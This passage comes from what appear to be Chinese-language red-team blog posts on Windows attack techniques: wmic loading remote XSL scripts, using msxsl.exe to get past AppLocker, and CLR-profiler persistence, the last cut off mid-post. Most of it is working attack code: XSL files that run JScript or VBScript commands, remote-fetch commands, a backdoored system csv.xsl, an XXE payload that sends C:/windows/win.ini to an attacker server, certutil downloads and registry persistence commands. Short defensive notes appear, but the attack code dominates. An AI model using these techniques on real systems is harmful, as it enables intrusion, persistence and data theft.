<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wmic os get /FORMAT:"https://example.com/evil.xsl"
</code></pre></div></div>

<p>xsl文件内容如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?xml version='1.0'?&gt;
&lt;stylesheet
xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt"
xmlns:user="placeholder"
version="1.0"&gt;
&lt;output method="text"/&gt;
	&lt;ms:script implements-prefix="user" language="JScript"&gt;
	&lt;![CDATA[
	var r = new ActiveXObject("WScript.Shell").Run("cmd.exe");
	]]&gt; &lt;/ms:script&gt;
&lt;/stylesheet&gt;
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>代码来源于https://gist.githubusercontent.com/caseysmithrc/68924cabbeca1285d2941298a5b91c24/raw/8574e0c019b17d84028833220ed0b30cf9eea84b/minimalist.xsl</p>

<h2 id="0x03-脚本分析">0x03 脚本分析</h2>
<hr>

<p>查看xsl文件格式，发现类似于之前研究过的利用脚本(使用msxsl.exe执行xsl脚本，也是学习自Casey Smith)，内容如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?xml version='1.0'?&gt;
&lt;xsl:stylesheet version="1.0"
      xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
      xmlns:msxsl="urn:schemas-microsoft-com:xslt"
      xmlns:user="http://mycompany.com/mynamespace"&gt;

&lt;msxsl:script language="JScript" implements-prefix="user"&gt;
   function xml(nodelist) {
	var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
      return nodelist.nextNode().xml;
	  
   }
&lt;/msxsl:script&gt;
&lt;xsl:template match="/"&gt;
   &lt;xsl:value-of select="user:xml(.)"/&gt;
&lt;/xsl:template&gt;
&lt;/xsl:stylesheet&gt;
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>代码来源于https://gist.github.com/subTee/47f16d60efc9f7cfefd62fb7a712ec8d</p>

<p>我对该技术的分析文章链接：</p>

<p>https://3gstudent.github.io/3gstudent.github.io/Use-msxsl-to-bypass-AppLocker/</p>

<p>经测试，文章<a href="https://3gstudent.github.io/3gstudent.github.io/Use-msxsl-to-bypass-AppLocker/">《Use msxsl to bypass AppLocker》</a>中使用的xsl脚本和xml脚本wmic均支持，只是对后缀名有要求(必须是xsl文件)</p>

<h3 id="实际测试">实际测试：</h3>

<p>执行：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wmic os get /format:"https://raw.githubusercontent.com/3gstudent/Use-msxsl-to-bypass-AppLocker/master/shellcode.xml"
</code></pre></div></div>

<p>执行失败，提示<code class="language-plaintext highlighter-rouge">Invalid XSL format (or) file name.</code></p>

<p>脚本内容不变，后缀名改为xsl，再次执行：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wmic os get /format:"https://raw.githubusercontent.com/3gstudent/Use-msxsl-to-bypass-AppLocker/master/shellcode.xsl"
</code></pre></div></div>

<p>执行成功，成功弹出计算器，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-4-23/2-1.png" alt="Alt text"></p>

<h3 id="补充-xsl和xml文件的异同">补充： xsl和xml文件的异同</h3>

<h4 id="相同点">相同点：</h4>

<p>语法规则基本相同，仅声明方式不同(以上测试代码未体现)</p>

<h4 id="不同点">不同点：</h4>

<p>用途不同，xml用于承载数据，xsl用户设置数据的格式</p>

<h4 id="简单理解">简单理解：</h4>

<p>通过使用XSL可以向XML文件添加显示信息，使用XSL显示XML</p>

<h2 id="0x04-后门利用思路">0x04 后门利用思路</h2>
<hr>

<p>通过学习Casey Smith在博客中分享的研究思路，我想到了一个后门利用的思路</p>

<p>对于路径<code class="language-plaintext highlighter-rouge">c:\Windows\System32\wbem</code>下的xsl文件</p>

<p>例如：</p>

<ul>
  <li>csv.xsl</li>
  <li>htable.xsl</li>
  <li>texttable.xsl</li>
</ul>

<p>同wmic命令的输出格式相对应，例如：</p>

<ul>
  <li>wmic os get /format:csv</li>
  <li>wmic os get /format:htable</li>
  <li>wmic os get /format:texttable</li>
</ul>

<p>那么，使用wmic命令在输出格式时是否会加载对应名称的xsl文件呢？</p>

<p>答案是肯定的</p>

<p>挑选其中的csv.xsl，内容如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?xml version="1.0"?&gt;
&lt;!-- Copyright (c) Microsoft Corporation.  All rights reserved. --&gt;
&lt;xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0"&gt;
&lt;xsl:output encoding="utf-16" omit-xml-declaration="yes"/&gt;
&lt;xsl:param name="norefcomma"/&gt;

&lt;xsl:template match="/"&gt;
Node,&lt;xsl:for-each select="COMMAND/RESULTS[1]/CIM/INSTANCE[1]//PROPERTY|COMMAND/RESULTS[1]/CIM/INSTANCE[1]//PROPERTY.ARRAY|COMMAND/RESULTS[1]/CIM/INSTANCE[1]//PROPERTY.REFERENCE"&gt;&lt;xsl:value-of select="@NAME"/&gt;&lt;xsl:if test="position()!=last()"&gt;,&lt;/xsl:if&gt;&lt;/xsl:for-each&gt;&lt;xsl:apply-templates select="COMMAND/RESULTS"/&gt;&lt;/xsl:template&gt; 

&lt;xsl:template match="RESULTS" xml:space="preserve"&gt;&lt;xsl:apply-templates select="CIM/INSTANCE"/&gt;&lt;/xsl:template&gt; 
&lt;xsl:template match="VALUE.ARRAY" xml:space="preserve"&gt;{&lt;xsl:for-each select="VALUE"&gt;&lt;xsl:apply-templates select="."/&gt;&lt;xsl:if test="position()!=last()"&gt;;&lt;/xsl:if&gt;&lt;/xsl:for-each&gt;}&lt;/xsl:template&gt;
&lt;xsl:template match="VALUE" xml:space="preserve"&gt;&lt;xsl:value-of select="."/&gt;&lt;/xsl:template&gt;
&lt;xsl:template match="INSTANCE" xml:space="preserve"&gt;
&lt;xsl:value-of select="../../@NODE"/&gt;,&lt;xsl:for-each select="PROPERTY|PROPERTY.ARRAY|PROPERTY.REFERENCE"&gt;&lt;xsl:apply-templates select="."/&gt;&lt;xsl:if test="position()!=last()"&gt;,&lt;/xsl:if&gt;&lt;/xsl:for-each&gt;&lt;/xsl:template&gt; 

&lt;xsl:template match="PROPERTY.REFERENCE" xml:space="preserve"&gt;&lt;xsl:apply-templates select="VALUE.REFERENCE"&gt;&lt;/xsl:apply-templates&gt;&lt;/xsl:template&gt;

&lt;xsl:template match="PROPERTY"&gt;&lt;xsl:apply-templates select="VALUE"/&gt;&lt;/xsl:template&gt;
&lt;xsl:template match="PROPERTY.ARRAY"&gt;&lt;xsl:for-each select="VALUE.ARRAY"&gt;&lt;xsl:apply-templates select="."/&gt;&lt;/xsl:for-each&gt;&lt;/xsl:template&gt;

&lt;xsl:template match="VALUE.REFERENCE"&gt;"&lt;xsl:apply-templates select="INSTANCEPATH/NAMESPACEPATH"/&gt;&lt;xsl:apply-templates select="INSTANCEPATH/INSTANCENAME|INSTANCENAME"/&gt;"&lt;/xsl:template&gt;

&lt;xsl:template match="NAMESPACEPATH"&gt;\\&lt;xsl:value-of select="HOST/text()"/&gt;&lt;xsl:for-each select="LOCALNAMESPACEPATH/NAMESPACE"&gt;\&lt;xsl:value-of select="@NAME"/&gt;&lt;/xsl:for-each&gt;:&lt;/xsl:template&gt;

&lt;xsl:template match="INSTANCENAME"&gt;&lt;xsl:value-of select="@CLASSNAME"/&gt;&lt;xsl:for-each select="KEYBINDING"&gt;&lt;xsl:if test="position()=1"&gt;.&lt;/xsl:if&gt;&lt;xsl:value-of select="@NAME"/&gt;="&lt;xsl:value-of select="KEYVALUE/text()"/&gt;"&lt;xsl:if test="position()!=last()"&gt;&lt;/xsl:if&gt;&lt;xsl:if test="not($norefcomma=&amp;quot;true&amp;quot;)"&gt;,&lt;/xsl:if&gt;&lt;xsl:if test="$norefcomma=&amp;quot;true&amp;quot;"&gt;&lt;xsl:text&gt; &lt;/xsl:text&gt;&lt;/xsl:if&gt;&lt;/xsl:for-each&gt;&lt;/xsl:template&gt;


&lt;/xsl:stylesheet&gt;
</code></pre></div></div>

<p>尝试在代码中添加payload，修改后的内容如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?xml version="1.0"?&gt;
&lt;!-- Copyright (c) Microsoft Corporation.  All rights reserved. --&gt;
&lt;xsl:stylesheet version="1.0"
      xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
      xmlns:msxsl="urn:schemas-microsoft-com:xslt"
      xmlns:user="urn:my-scripts"&gt;
&lt;xsl:output encoding="utf-16" omit-xml-declaration="yes"/&gt;
&lt;xsl:param name="norefcomma"/&gt;

&lt;msxsl:script language="JScript" implements-prefix="user"&gt;
   function myFunction() {
	var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
      	return "";	  
   }
&lt;/msxsl:script&gt;

&lt;xsl:template match="/"&gt;

&lt;xsl:value-of select="user:myFunction()"/&gt;

Node,&lt;xsl:for-each select="COMMAND/RESULTS[1]/CIM/INSTANCE[1]//PROPERTY|COMMAND/RESULTS[1]/CIM/INSTANCE[1]//PROPERTY.ARRAY|COMMAND/RESULTS[1]/CIM/INSTANCE[1]//PROPERTY.REFERENCE"&gt;&lt;xsl:value-of select="@NAME"/&gt;&lt;xsl:if test="position()!=last()"&gt;,&lt;/xsl:if&gt;&lt;/xsl:for-each&gt;&lt;xsl:apply-templates select="COMMAND/RESULTS"/&gt;&lt;/xsl:template&gt; 


&lt;xsl:template match="RESULTS" xml:space="preserve"&gt;&lt;xsl:apply-templates select="CIM/INSTANCE"/&gt;&lt;/xsl:template&gt; 
&lt;xsl:template match="VALUE.ARRAY" xml:space="preserve"&gt;{&lt;xsl:for-each select="VALUE"&gt;&lt;xsl:apply-templates select="."/&gt;&lt;xsl:if test="position()!=last()"&gt;;&lt;/xsl:if&gt;&lt;/xsl:for-each&gt;}&lt;/xsl:template&gt;
&lt;xsl:template match="VALUE" xml:space="preserve"&gt;&lt;xsl:value-of select="."/&gt;&lt;/xsl:template&gt;
&lt;xsl:template match="INSTANCE" xml:space="preserve"&gt;
&lt;xsl:value-of select="../../@NODE"/&gt;,&lt;xsl:for-each select="PROPERTY|PROPERTY.ARRAY|PROPERTY.REFERENCE"&gt;&lt;xsl:apply-templates select="."/&gt;&lt;xsl:if test="position()!=last()"&gt;,&lt;/xsl:if&gt;&lt;/xsl:for-each&gt;&lt;/xsl:template&gt; 

&lt;xsl:template match="PROPERTY.REFERENCE" xml:space="preserve"&gt;&lt;xsl:apply-templates select="VALUE.REFERENCE"&gt;&lt;/xsl:apply-templates&gt;&lt;/xsl:template&gt;

&lt;xsl:template match="PROPERTY"&gt;&lt;xsl:apply-templates select="VALUE"/&gt;&lt;/xsl:template&gt;
&lt;xsl:template match="PROPERTY.ARRAY"&gt;&lt;xsl:for-each select="VALUE.ARRAY"&gt;&lt;xsl:apply-templates select="."/&gt;&lt;/xsl:for-each&gt;&lt;/xsl:template&gt;

&lt;xsl:template match="VALUE.REFERENCE"&gt;"&lt;xsl:apply-templates select="INSTANCEPATH/NAMESPACEPATH"/&gt;&lt;xsl:apply-templates select="INSTANCEPATH/INSTANCENAME|INSTANCENAME"/&gt;"&lt;/xsl:template&gt;

&lt;xsl:template match="NAMESPACEPATH"&gt;\\&lt;xsl:value-of select="HOST/text()"/&gt;&lt;xsl:for-each select="LOCALNAMESPACEPATH/NAMESPACE"&gt;\&lt;xsl:value-of select="@NAME"/&gt;&lt;/xsl:for-each&gt;:&lt;/xsl:template&gt;

&lt;xsl:template match="INSTANCENAME"&gt;&lt;xsl:value-of select="@CLASSNAME"/&gt;&lt;xsl:for-each select="KEYBINDING"&gt;&lt;xsl:if test="position()=1"&gt;.&lt;/xsl:if&gt;&lt;xsl:value-of select="@NAME"/&gt;="&lt;xsl:value-of select="KEYVALUE/text()"/&gt;"&lt;xsl:if test="position()!=last()"&gt;&lt;/xsl:if&gt;&lt;xsl:if test="not($norefcomma=&amp;quot;true&amp;quot;)"&gt;,&lt;/xsl:if&gt;&lt;xsl:if test="$norefcomma=&amp;quot;true&amp;quot;"&gt;&lt;xsl:text&gt; &lt;/xsl:text&gt;&lt;/xsl:if&gt;&lt;/xsl:for-each&gt;&lt;/xsl:template&gt;


&lt;/xsl:stylesheet&gt;
</code></pre></div></div>

<p>替换原文件，需要管理员权限</p>

<p><strong>注：</strong></p>

<p>csv.xsl的路径同系统语言版本有关，如果是英文系统，路径为<code class="language-plaintext highlighter-rouge">C:\Windows\System32\wbem\en-US</code>，如果是中文系统，路径为<code class="language-plaintext highlighter-rouge">C:\Windows\System32\wbem\zh-CN</code></p>

<p>测试使用wmic的输出格式命令：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wmic os get /format:csv
</code></pre></div></div>

<p>执行payload，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-4-23/2-2.png" alt="Alt text"></p>

<h2 id="0x05-同xxe漏洞的结合">0x05 同XXE漏洞的结合</h2>
<hr>

<p>XXE是XML External Entity attack的缩写</p>

<p>前不久一个和Windows相关的XXE漏洞：CVE-2018-0878</p>

<p>poc地址如下：</p>

<p>https://www.exploit-db.com/exploits/44352/</p>

<p>同样可在wmic命令上触发</p>

<h3 id="漏洞测试">漏洞测试：</h3>

<h4 id="1使用kali-linux建立httt服务器">1、使用kali linux建立httt服务器</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python -m SimpleHTTPServer 8080
</code></pre></div></div>

<h4 id="2kali-linux目录下创建文件xxexml">2、kali linux目录下创建文件xxe.xml</h4>

<p>内容如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;!ENTITY % payload SYSTEM "file:///C:/windows/win.ini"&gt;  
&lt;!ENTITY % root "&lt;!ENTITY &amp;#37; oob SYSTEM 'http://192.168.62.140:8080/?%payload;'&gt; "&gt;  
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>kali linux的IP为192.168.62.140</p>

<h4 id="3创建payloadxsl">3、创建payload.xsl</h4>

<p>内容如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?xml version="1.0" encoding="UTF-8" ?&gt;  
&lt;!DOCTYPE zsl [  
&lt;!ENTITY % remote SYSTEM "http://192.168.62.140:8080/xxe.xml"&gt;  
%remote;%root;%oob;]&gt;
</code></pre></div></div>

<h4 id="4windows系统使用wmic加载该xsl文件">4、windows系统使用wmic加载该xsl文件</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wmic os get /format:payload.xsl
</code></pre></div></div>

<p>执行失败，提示<code class="language-plaintext highlighter-rouge">Invalid XSL format (or) file name.</code></p>

<p>然而，漏洞成功触发，服务器获得文件<code class="language-plaintext highlighter-rouge">C:/windows/win.ini</code>的内容，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-4-23/3-1.png" alt="Alt text"></p>

<h2 id="0x06-小结">0x06 小结</h2>
<hr>

<p>本文测试了使用wmic从本地或从URL调用XSL文件的方法，分享了一个后门利用的思路，并结合CVE-2018-0878对XXE漏洞进行了测试。
站在防御的角度，如果wmic.exe发起了网络连接，那么很有可能是加载了特殊xsl文件的原因，值得注意。</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on April 23, 2018
  </div>

  
</article><article class="post">
  <h1>Use msxsl to bypass AppLocker</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>Casey Smith@subTee在twitter分享的一个技巧，使用包含微软签名的msxsl.exe能够执行JScript代码，从而实现对Applocker的绕过。</p>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-11/1-1.png" alt="Alt text"></p>

<p><strong>twitter地址如下：</strong></p>

<p>https://twitter.com/subTee/status/877616321747271680</p>

<p><strong>POC地址如下：</strong></p>

<p>https://gist.github.com/subTee/47f16d60efc9f7cfefd62fb7a712ec8d</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要对这项技术进行介绍，分析可供进一步利用的方法，同时对其扩展，介绍使用msxsl.exe执行VBScript代码的方式</p>

<h2 id="0x02-msxsl">0x02 msxsl</h2>
<hr>

<h3 id="1msxslexe">1、msxsl.exe</h3>

<ul>
  <li>XSL(Extensible Stylesheet Language)转换器</li>
  <li>命令行工具</li>
  <li>带有微软数字签名</li>
</ul>

<p><strong>下载地址：</strong></p>

<p>https://www.microsoft.com/en-us/download/details.aspx?id=21714</p>

<p>执行如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-11/2-1.png" alt="Alt text"></p>

<p>参考Casey Smith的POC:</p>

<p>customers.xml:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?xml version="1.0"?&gt;
&lt;?xml-stylesheet type="text/xsl" href="script.xsl" ?&gt;
&lt;customers&gt;
   &lt;customer&gt;
      &lt;name&gt;John Smith&lt;/name&gt;
      &lt;address&gt;123 Elm St.&lt;/address&gt;
      &lt;phone&gt;(123) 456-7890&lt;/phone&gt;
   &lt;/customer&gt;
   &lt;customer&gt;
      &lt;name&gt;Mary Jones&lt;/name&gt;
      &lt;address&gt;456 Oak Ave.&lt;/address&gt;
      &lt;phone&gt;(156) 789-0123&lt;/phone&gt;
   &lt;/customer&gt;
&lt;/customers&gt;
</code></pre></div></div>

<p>script.xml:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?xml version='1.0'?&gt;
&lt;xsl:stylesheet version="1.0"
      xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
      xmlns:msxsl="urn:schemas-microsoft-com:xslt"
      xmlns:user="http://mycompany.com/mynamespace"&gt;

&lt;msxsl:script language="JScript" implements-prefix="user"&gt;
   function xml(nodelist) {
	var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
      return nodelist.nextNode().xml;
	  
   }
&lt;/msxsl:script&gt;
&lt;xsl:template match="/"&gt;
   &lt;xsl:value-of select="user:xml(.)"/&gt;
&lt;/xsl:template&gt;
&lt;/xsl:stylesheet&gt;
</code></pre></div></div>

<p>成功执行JScript代码，弹出计算器，poc执行如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-11/2-2.png" alt="Alt text"></p>

<p>开启Applocker，添加规则拦截js脚本的执行，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-11/2-3.png" alt="Alt text"></p>

<p>但是使用msxsl仍然能够执行JScript代码</p>

<p>在之前的文章<a href="https://3gstudent.github.io/3gstudent.github.io/%E5%88%A9%E7%94%A8JS%E5%8A%A0%E8%BD%BD.Net%E7%A8%8B%E5%BA%8F/">《利用JS加载.Net程序》</a>介绍过利用JScript脚本加载.Net程序的方法，结合本文，可以得出推论：</p>

<p><strong>使用msxsl也能够执行c#代码</strong></p>

<p>具体来说，能够实现以下功能：</p>

<ul>
  <li>执行shellcode</li>
  <li>执行mimikatz</li>
  <li>执行powershell脚本</li>
</ul>

<h3 id="2执行shellcode">2、执行shellcode</h3>

<p>可参照Cn33liz的StarFighters，地址如下：</p>

<p>https://github.com/Cn33liz/StarFighters/blob/master/StarFighter.js</p>

<p>结合Casey的POC，就能够实现利用msxsl执行shellcode</p>

<p>完整代码我已经上传至github，地址如下：</p>

<p>https://github.com/3gstudent/Use-msxsl-to-bypass-AppLocker/blob/master/shellcode.xml</p>

<p>测试如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-11/3-1.png" alt="Alt text"></p>

<p>对于执行mimikatz和powershell脚本，思路可参照之前的文章<a href="https://3gstudent.github.io/3gstudent.github.io/%E5%88%A9%E7%94%A8JS%E5%8A%A0%E8%BD%BD.Net%E7%A8%8B%E5%BA%8F/">《利用JS加载.Net程序》</a></p>

<h2 id="0x03-脚本优化">0x03 脚本优化</h2>
<hr>

<p>分析xml文件格式，对Casey的POC作适当优化</p>

<h3 id="1精简customersxml">1、精简customers.xml</h3>

<p>XML元素命名规则：</p>

<ul>
  <li>名称可以含字母、数字以及其他的字符</li>
  <li>名称不能以数字或者标点符号开始</li>
  <li>名称不能以字符 “xml”（或者 XML、Xml）开始</li>
  <li>名称不能包含空格</li>
  <li>可使用任何名称，没有保留的字词</li>
</ul>

<p>原POC内容如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?xml version="1.0"?&gt;
&lt;?xml-stylesheet type="text/xsl" href="script.xsl" ?&gt;
&lt;customers&gt;
   &lt;customer&gt;
      &lt;name&gt;John Smith&lt;/name&gt;
      &lt;address&gt;123 Elm St.&lt;/address&gt;
      &lt;phone&gt;(123) 456-7890&lt;/phone&gt;
   &lt;/customer&gt;
   &lt;customer&gt;
      &lt;name&gt;Mary Jones&lt;/name&gt;
      &lt;address&gt;456 Oak Ave.&lt;/address&gt;
      &lt;phone&gt;(156) 789-0123&lt;/phone&gt;
   &lt;/customer&gt;
&lt;/customers&gt;
</code></pre></div></div>

<p>经分析，参数1中的xml文件不重要，元素可以任意指定</p>

<p>去掉不相关的参数，重新命名一个xml元素，精简后代码如下：</p>

<p><code class="language-plaintext highlighter-rouge">&lt;a&gt;&lt;/a&gt;</code></p>

<p>并且，如果为了少创建文件，使用script.xsl作为第一个xml文件参数也是可以的</p>

<p>例如,参数如下：</p>

<p><code class="language-plaintext highlighter-rouge">msxsl.exe script.xsl script.xsl</code></p>

<p>执行成功，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-11/3-2.png" alt="Alt text"></p>

<h3 id="2优化scriptxsl">2、优化script.xsl</h3>

<p>执行VBScript代码：</p>

<p><strong>注：</strong></p>

<p>经测试，此xml脚本不支持CSharp，同该资料相违背，此问题有待解决</p>

<p>资料地址如下：</p>

<p>https://msdn.microsoft.com/en-us/library/533texsx(VS.71).aspx</p>

<p>对于VBScript语言，不支持return表示函数返回值，通过函数名=需要返回的值来表示函数返回值</p>

<p>完整内容如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?xml version='1.0'?&gt;
&lt;xsl:stylesheet version="1.0"
      xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
      xmlns:msxsl="urn:schemas-microsoft-com:xslt"
      xmlns:user="urn:my-scripts"&gt;

&lt;msxsl:script language="VBScript" implements-prefix="user"&gt;
function myFunction()
	set shell=createobject("wscript.shell")
	shell.run "calc.exe",0
	myFunction = 0
end function

&lt;/msxsl:script&gt;
&lt;xsl:template match="/"&gt;
&lt;xsl:value-of select="user:myFunction()"/&gt;
&lt;/xsl:template&gt;
&lt;/xsl:stylesheet&gt;
</code></pre></div></div>

<p>以上文件内容对应github地址：https://github.com/3gstudent/Use-msxsl-to-bypass-AppLocker/blob/master/VBScript.xml</p>

<p><strong>注：</strong></p>

<p>调用函数名要对应：</p>

<p><code class="language-plaintext highlighter-rouge">&lt;xsl:value-of select="user:myFunction()"/&gt;</code></p>

<h3 id="3远程执行">3、远程执行</h3>

<p>msxsl.exe也支持远程执行，参数如下：</p>

<p><code class="language-plaintext highlighter-rouge">msxls.exe https://raw.githubusercontent.com/3gstudent/Use-msxsl-to-bypass-AppLocker/master/shellcode.xml https://raw.githubusercontent.com/3gstudent/Use-msxsl-to-bypass-AppLocker/master/shellcode.xml</code></p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-11/3-3.png" alt="Alt text"></p>

<p><strong>注：</strong></p>

<p>该方法是从Evi1cg学来的，博客地址：https://evi1cg.me/archives/AppLocker_Bypass_MSXSL.html</p>

<h2 id="0x04-防御">0x04 防御</h2>
<hr>

<p>添加Applocker的可执行规则，指定msxsl.exe</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-11/4-1.png" alt="Alt text"></p>

<p>即使更改文件路径，msxsl.exe仍然无法执行</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-11/4-2.png" alt="Alt text"></p>

<h2 id="0x05-小结">0x05 小结</h2>
<hr>

<p>本文介绍了利用msxsl绕过AppLocker的方法，但是通过定制AppLocker规则，还是能够限制该方法的使用。</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>

  </div>

  <div class="date">
    Written on July 11, 2017
  </div>

  
</article><article class="post">
  <h1>Use CLR to maintain persistence</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>在之前的文章<a href="https://3gstudent.github.io/3gstudent.github.io/Use-AppDomainManager-to-maintain-persistence/">《Use AppDomainManager to maintain persistence》</a>介绍了通过AppDomainManager实现的一种被动后门触发机制，演示了如何劫持系统.Net程序powershell_ise.exe，但前提是需要获得管理员权限。
这一次将更进一步，介绍一种无需管理员权限的后门，并能够劫持所有.Net程序。</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>CLR的使用</li>
  <li>后门开发思路</li>
  <li>POC编写</li>
  <li>后门检测</li>
</ul>

<h2 id="0x02-clr的使用">0x02 CLR的使用</h2>
<hr>

<p><strong>CLR：</strong></p>

<p>全称Common Language Runtime（公共语言运行库），是一个可由多种编程语言使用的运行环境。</p>

<p>CLR是.NET Framework的主要执行引擎，作用之一是监视程序的运行：</p>

<ul>
  <li>在CLR监视之下运行的程序属于“托管的”（managed）代码</li>
  <li>不在CLR之下、直接在裸机上运行的应用或者组件属于“非托管的”（unmanaged）的代码</li>
</ul>

<p><strong>CLR的使用：</strong></p>

<p>测试系统： Win8 x86</p>

<h3 id="1启动cmd">1、启动cmd</h3>

<p>输入如下代码：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SET COR_ENABLE_PROFILING=1
SET COR_PROFILER={11111111-1111-1111-1111-111111111111}
</code></pre></div></div>

<p><strong>注：</strong></p>

<p><code class="language-plaintext highlighter-rouge">{11111111-1111-1111-1111-111111111111}</code>表示CLSID</p>

<p>可设置为任意数值，只要不和系统常用CLSID冲突就好</p>

<h3 id="2测试dll">2、测试dll</h3>

<p>使用弹框dll，下载地址：</p>

<p>https://raw.githubusercontent.com/3gstudent/test/master/msg.dll</p>

<p>dll开发过程可参考：</p>

<p>https://3gstudent.github.io/3gstudent.github.io/Use-Office-to-maintain-persistence/</p>

<p>可在cmd下实现直接下载，代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certutil.exe -urlcache -split -f https://raw.githubusercontent.com/3gstudent/test/master/msg.dll
certutil.exe -urlcache -split -f https://raw.githubusercontent.com/3gstudent/test/master/msg.dll delete
</code></pre></div></div>

<p>操作如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-28/2-1.png" alt="Alt text"></p>

<p><strong>注：</strong></p>

<p>delete是为了清除下载文件的缓存</p>

<p>更多关于使用certutil.exe下载文件的利用细节可参考文章：</p>

<p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84certutil.exe/">《渗透测试中的certutil.exe》</a></p>

<h3 id="3操作注册表">3、操作注册表</h3>

<p>注册表路径：<code class="language-plaintext highlighter-rouge">HKEY_CURRENT_USER\Software\Classes\CLSID\</code></p>

<p>新建子项<code class="language-plaintext highlighter-rouge">{11111111-1111-1111-1111-111111111111}</code>，同步骤1 cmd输入的CLSID对应
新建子项<code class="language-plaintext highlighter-rouge">InProcServer32</code>
新建键值<code class="language-plaintext highlighter-rouge">REG_SZ ThreadingModel：Apartment</code>
默认路径改为msg.dll的路径</p>

<p>修改后的注册表如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-28/2-2.png" alt="Alt text"></p>

<p>对应cmd代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SET KEY=HKEY_CURRENT_USER\Software\Classes\CLSID\{11111111-1111-1111-1111-111111111111}\InProcServer32
REG.EXE ADD %KEY% /VE /T REG_SZ /D "%CD%\msg.dll" /F
REG.EXE ADD %KEY% /V ThreadingModel /T REG_SZ /D Apartment /F
</code></pre></div></div>

<h3 id="4在当前cmd启动net程序">4、在当前cmd启动.net程序</h3>

<p>例如powershell.exe，启动时加载msg.dll，弹框</p>

<p>操作如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-28/2-3.png" alt="Alt text"></p>

<p><strong>注:</strong></p>

<p>使用其他cmd执行powershell.exe不会加载msg.dll</p>

<p><strong>原因：</strong></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SET COR_ENABLE_PROFILING=1
SET COR_PROFILER={11111111-1111-1111-1111-111111111111}
</code></pre></div></div>

<p>只作用于当前cmd，可通过cmd命令<code class="language-plaintext highlighter-rouge">"set"</code>判断</p>

<p>当然，执行其他.net程序也会加载msg.dll</p>

<p>测试如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-28/2-4.png" alt="Alt text"></p>

<h2 id="0x03-后门开发思路">0x03 后门开发思路</h2>
<hr>

<p>由以上测试得出结论，使用CLR能够劫持所有.Net程序的启动，但是只能作用于当前cmd</p>

<p>能否作用于全局呢？</p>

